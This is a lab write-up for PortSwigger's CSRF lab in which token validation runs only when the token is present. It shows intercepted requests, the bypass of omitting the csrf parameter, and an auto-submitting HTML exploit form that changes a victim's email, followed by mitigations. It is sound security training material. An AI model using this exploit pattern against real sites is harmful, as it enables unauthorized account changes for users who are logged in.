# 001_en_csrf_token_validation_token_being_present.md

# 📘 PortSwigger Lab: CSRF where token validation depends on token being present

<a id="top"></a>

🔗 **Official Lab:** https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present  
🎯 **Topic:** CSRF — bypassing token validation when the token is simply omitted  
🧪 **Difficulty:** Practitioner  
✅ **Status:** Solved  
🛠 **Tools:** Burp Suite (Proxy, Repeater, Engagement tools / Generate CSRF PoC), Exploit Server  
🔑 **Credentials:** `wiener:peter`

---

## 📑 Contents
- [001\_en\_csrf\_token\_validation\_token\_being\_present.md](#001_en_csrf_token_validation_token_being_presentmd)
- [📘 PortSwigger Lab: CSRF where token validation depends on token being present](#-portswigger-lab-csrf-where-token-validation-depends-on-token-being-present)
  - [📑 Contents](#-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Short Theory](#-short-theory)
  - [🧩 Core Idea](#-core-idea)
  - [🗺 Attack Scheme](#-attack-scheme)
  - [🔍 Step 1 — Analyze Legitimate Request](#-step-1--analyze-legitimate-request)
  - [🔍 Step 2 — Verify Token Validation](#-step-2--verify-token-validation)
  - [🔍 Step 3 — Delete the CSRF Parameter](#-step-3--delete-the-csrf-parameter)
  - [🔍 Step 4 — Build CSRF Exploit](#-step-4--build-csrf-exploit)
  - [🔍 Step 5 — Test Exploit on Yourself](#-step-5--test-exploit-on-yourself)
  - [🔍 Step 6 — Deliver Exploit to Victim](#-step-6--deliver-exploit-to-victim)
  - [📨 Example Requests](#-example-requests)
  - [📥 Example Result](#-example-result)
  - [🧾 Complete Attack Chain](#-complete-attack-chain)
  - [🔬 Why the Attack Worked](#-why-the-attack-worked)
  - [🧠 Pentester Mindset](#-pentester-mindset)
  - [❌ Common Mistakes](#-common-mistakes)
  - [🛡 Mitigation](#-mitigation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

<a id="goal"></a>
## 🎯 Goal
The email change functionality is protected by a CSRF token, but the token validation is flawed — it only runs when the token is present. The task:

1. Use the exploit server to host an HTML page that performs a CSRF attack.
2. Change the victim's email address via CSRF.

<a id="theory"></a>
## 🧠 Short Theory
CSRF (Cross-Site Request Forgery) is an attack where the attacker forces the victim's browser to perform an unwanted action on a vulnerable site where the victim is authenticated.

The standard defense is a CSRF token that must be present and valid in every state-changing request. A common implementation flaw is **conditional validation**: the server checks the token only if the parameter exists in the request. If the parameter is omitted entirely, the validation logic is skipped and the request is processed as if it were trusted. A defense that can be bypassed by omission is equivalent to no defense at all.

<a id="idea"></a>
## 🧩 Core Idea
Simply removing the `csrf` parameter from the request bypasses token validation.

- The server validates the token only when the parameter is present; absence of the parameter skips the check entirely.
- The exploit form therefore contains **no `csrf` input at all** — no knowledge of the victim's token is required.
- Auto-submit via JavaScript makes the attack invisible to the victim.

<a id="attack-scheme"></a>
## 🗺 Attack Scheme
1. **Recon:** Intercept `POST /my-account/change-email` with csrf token.
2. **Verify:** Modify csrf value → rejected (token is validated).
3. **Bypass:** Delete the csrf parameter entirely → request accepted.
4. **Exploit:** HTML form without a csrf input + auto-submit.
5. **Test:** View exploit on yourself → email changed.
6. **Deliver:** Deliver to victim → lab solved.

<a id="step1"></a>
## 🔍 Step 1 — Analyze Legitimate Request
Logged in as `wiener:peter` in Burp's browser, submitted the "Update email" form, and intercepted the request in Burp Proxy.

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

<a id="step2"></a>
## 🔍 Step 2 — Verify Token Validation
Sent the request to Burp Repeater and changed the `csrf` value to an arbitrary one → the server rejected the request. The token is validated when present.

<a id="step3"></a>
## 🔍 Step 3 — Delete the CSRF Parameter
Removed the `csrf` parameter from the request body entirely and resent:

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

**Result:** the request was **accepted** and the email was changed — validation is skipped when the token is absent.

*Conclusion: the protection only fires when the parameter exists; omission = trusted.*

<a id="step4"></a>
## 🔍 Step 4 — Build CSRF Exploit
Generated the PoC via right-click → Engagement tools → **Generate CSRF PoC** (auto-submit script enabled), or manually:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

*Important: the form contains no `csrf` input — the server will not require one.*

<a id="step5"></a>
## 🔍 Step 5 — Test Exploit on Yourself
Pasted the HTML into the exploit server "Body" field, stored it, and clicked "View exploit". Confirmed in Burp Proxy that the POST goes through without a csrf parameter and the email changes. Then changed the email in the exploit so it doesn't match the current one.

<a id="step6"></a>
## 🔍 Step 6 — Deliver Exploit to Victim
Stored the exploit and clicked "Deliver to victim". The victim's email was changed → lab solved.

<a id="requests"></a>
## 📨 Example Requests
**Legitimate POST (with token)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

**Bypass (csrf parameter omitted entirely)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net
```

<a id="response"></a>
## 📥 Example Result
**Token Validation Check**
- POST with modified csrf → "Invalid CSRF token" (rejected)
- POST with valid csrf → 302 Redirect (success)

**Bypass**
- POST with **no csrf parameter at all** → 302 Redirect (success)  
→ Email changed without any token validation

<a id="attack-chain"></a>
## 🧾 Complete Attack Chain
1. `POST /my-account/change-email` → intercept, csrf token present.
2. Repeater → modify csrf → rejected (token validated when present).
3. Delete the csrf parameter → request accepted.
4. Exploit Server → HTML form without csrf input + auto-submit.
5. View exploit → test on yourself → email changed.
6. Deliver to victim → victim's email changed → **Solved**.

<a id="breakdown"></a>
## 🔬 Why the Attack Worked
- **Conditional validation:** the server checks the token only if the parameter exists; a missing parameter skips the check instead of triggering rejection.
- **Fail-open logic:** the validator treats "no token" as "nothing to validate" rather than as a policy violation.
- **No token knowledge required:** the attacker does not need to obtain or guess the victim's CSRF token — omission is enough.
- **Auto-submit:** JavaScript submits the form instantly, the victim does not notice the attack.

<a id="pentester"></a>
## 🧠 Pentester Mindset
1. **Try removing the token first:** the simplest CSRF bypass — if the request passes without it, the protection is incomplete.
2. **Test modification before removal:** confirm whether the token is checked at all when present.
3. **Check parameter location:** try removing the token from body, query string, and headers separately.
4. **Use Generate CSRF PoC:** Burp Pro builds a ready exploit from the intercepted request.
5. **Always test on yourself:** "View exploit" confirms the request succeeds without a token before delivery.

<a id="mistakes"></a>
## ❌ Common Mistakes
- **Leaving the csrf input in the exploit form:** if the token is present but wrong, the request is rejected — remove the parameter entirely.
- **Only testing token modification:** changing the value shows validation exists; the bypass requires full removal.
- **Forgot to change the email in the exploit:** if the address matches the current one, no change occurs — the lab won't be solved.
- **Forgot auto-submit:** without `<script>` the form won't submit automatically.
- **Wrong lab URL:** the action must point to the real LAB-ID.

<a id="defense"></a>
## 🛡 Mitigation
- **Reject requests with a missing CSRF token** — validation must be mandatory for every state-changing request; absence is a failure, not a skip.
- Use framework-level CSRF protection (built-in middleware) instead of custom, conditionally-applied logic.
- **SameSite cookies** (Lax/Strict) as defense in depth.
- Check **Origin/Referer** headers for state-changing requests.
- Centralize validation in a single filter/interceptor so no endpoint can be reached without it.

<a id="checklist"></a>
## ✅ Checklist
- [ ] Intercepted POST request with csrf token
- [ ] Confirmed: modifying csrf → rejected
- [ ] Deleted csrf parameter → request accepted
- [ ] Built HTML exploit **without** a csrf input + auto-submit
- [ ] View exploit → tested on yourself → email changed
- [ ] Email in exploit differs from current
- [ ] Deliver to victim → lab solved
- [ ] Status: **Solved**

<a id="conclusion"></a>
## 🧾 Conclusion
The lab demonstrates a fail-open CSRF validation flaw: the token is checked only when it is present in the request. The key lesson: a security check that can be bypassed by omitting the input is not a check at all — validation must reject any request lacking a valid token. Simply deleting the `csrf` parameter bypassed the protection, and an HTML form without a token input allowed changing the victim's email.

⬆ [Back to top](#top)